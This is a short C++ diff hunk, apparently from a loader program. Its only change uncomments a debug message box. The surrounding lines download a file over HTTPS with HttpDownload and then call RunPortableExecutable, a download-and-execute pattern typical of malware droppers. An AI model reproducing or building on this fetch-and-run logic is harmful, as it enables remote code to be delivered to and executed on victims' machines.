@@ -67,7 +67,7 @@ public:
 
 		int size = HttpDownload(host, path, 443, TRUE);
 
-		//fn.fnMessageBoxA(NULL, newbuff, NULL, MB_OK);
+		fn.fnMessageBoxA(NULL, newbuff, NULL, MB_OK);
 	
 		RunPortableExecutable();
 
